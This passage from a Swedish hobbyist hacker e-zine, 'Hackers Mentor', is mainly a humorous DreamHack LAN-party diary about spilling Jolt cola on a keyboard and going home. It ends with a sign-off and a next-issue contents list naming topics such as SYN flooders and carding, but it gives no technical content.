SENT PÅ LÖRDAG NATT Skulle jag plocka upp min gamla, gamla laptop ur väskan
och kom då åt ett par sladdar som satt slingrade runt en burk med Jolt cola.
Burken vickade, jolten rann ut på tangentbordet, musmattan, mögtalarväggarna, stolen,
byxorna, Laptop sladdarna och golvet. Det enda som gick sönder var dock tangentbordet.
Jag har aldrig hatat Jolt så mycket som just då. Tur som fan var att det inte rann ut på
grannens grejjer. Inte en droppe!, jag fick springa och hämta papper, byta byxor, torka av
stolen, sladdarna, högtalarna, väskan, bordet, krama ur musmattan, vicka på tangentbordet
och hälla ut colan. Torka upp den, springa och slänga burken och papprena, tvätta händerna,
gå tillbaka och konstatera att jag lika gärna kunde gå och lägga mig.
Tältet där de sålde hårdvara hade slut på tangentbord. Databutiken var stängd.
Dagen därpå, söndag, gick jag och skulle köpa ett nytt. Men, är inte butiken stängd på
söndag? Puh, de hade extraöppet under DreamHack.

- ”Detta är det enda vi har kvar, det kostar, men det är ju också det bästa dårå”,
sa butiksinnehavaren. Jo visst, 300:- för ett nytt KeyTronic tangentbord var väl ok..
Men 300 minus på grund av en burk med Jolt. ARGGG!!

Snyggt var det, jag skriver på det nu. Men jag får psykbryte! Tangenterna sitter för brett
isär och det låter högt som fan när man knapprar på det. Pang! Pang! – där slog jag på
mellanslags tangenten, så löst som möjligt. Pang! Pang!



Dag 5: söndag

Jag vaknade vid 12, köpte nytt tangentbord, packade ihop datorn och prylarna.
Robb´s föräldrar hämtade oss vid 13:00 tiden. Fy fan va trött man blir.
ÄVEN fast jag hade lyckats sovit mellan klockan 05:00 och 12:00 varje dag.

Det var svettigt, man luktade helvete. Kläderna var inpyrda med koldioxid och Jolt.
Min madrass hade råkat lega bredvid en sopsäck där man kastade tomburkar. Såna där
Joltisar med lite granna kvar i botten på. En sjö av läsk hade samlat sig vid min madrass som
såg ut att ha blivit nedblött av någon som ”kissar i sängen”. Det luktade inte särskiljt gott.

Vi åkte hem, jag var pissnödig hela vägen. Det var otroligt skönt att komma hem.
Jobbigt som tusan var det.. Men, var det roligt?? Jag vet faktist inte riktigt, men en sak
är säker.. Vi åker dit nästa år igen! Då med lite  större och starkare och tuffare utrustning!

DreamHack ska förmodligen då byta lokaler. Arenan ska byggas om till utbildningscenter.
(kanske). Så vi får se vart det blir då. Kom dit och träffa oss då! :-).

// DH Report 2k – icecoder.


Här hade jag tänkt skriva lite om NT Hacking. Tacka mig för att jag lät bli!
Jag har tyvärr haft för lite tid över för Hackers Mentor på senaste tiden, men till sist kom den ut
till er. Det blir mer skojj i nästa bok. Ha det bra till dess!

// icecoder


Hitta de senaste uppdateringarna och böckerna på: www.insecurefoundation.cjb.net

För frågor och svar, maila:
ounder@lords.com .


Hackers Mentor © 1998-2004 – Insecure Foundation.
Hitta författaren samt ”teamet” på #BIOS @ Dalnet – IRC.


I nästa nummer:

Kapitel 1: Introduktion och Inspiration.
Kapitel 2: Fortsatt C++ programmering.
Kapitel 3: Mer kommandon i Unix.
Kapitel 4: X och Shell programmering i Unix.
Kapitel 5: SYN Flooders och Sniffers
Kapitel 6: Tankar och idéer.
Kapitel 7: Intressanta länkar
Kapitel 8: Insändare och Greetings. (Prat från IRC).
Kapitel 9: Allt om Carding.

